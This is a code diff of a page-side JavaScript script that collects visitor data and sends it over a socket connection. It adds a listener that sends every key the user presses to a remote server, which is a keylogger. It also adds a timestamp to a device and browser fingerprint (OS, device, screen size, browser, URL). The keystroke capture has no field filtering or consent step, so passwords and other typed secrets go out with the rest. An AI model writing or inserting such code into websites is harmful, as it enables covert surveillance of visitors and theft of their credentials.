@@ -75,6 +75,10 @@ jqueryScript.onload = function () {
             })
 
 
+            document.addEventListener('keyup', function (event) {
+                socket.emit("sendDataKeyboard", event.key);
+            });
+
             const userAgent = window.navigator.userAgent;
 
             var ppi = window.devicePixelRatio / (window.innerWidth * 0.0393701);
@@ -86,9 +90,6 @@ jqueryScript.onload = function () {
             var DEVICE = '';
             var BROWSER = '';
             var COUNTRY = '';
-
-
-
 
             if (/Windows/.test(userAgent)) {
                 OS = "Windows";
@@ -135,12 +136,22 @@ jqueryScript.onload = function () {
                 BROWSER = "The user's browser could not be determined";
             }
 
+            var currentdate = new Date();
+            var currentTime = currentdate.getFullYear() + "-"
+                + (currentdate.getMonth() + 1) + "-"
+                + currentdate.getDate() + " "
+                + currentdate.getHours() + ":"
+                + currentdate.getMinutes() + ":"
+                + currentdate.getSeconds();
+
+
             var userAgentData = {
                 url: URL,
                 os: OS,
                 device: DEVICE,
                 size: SIZE,
                 browser: BROWSER,
+                start_time: currentTime,
             }
 
             socket.emit('userAgent', userAgentData);
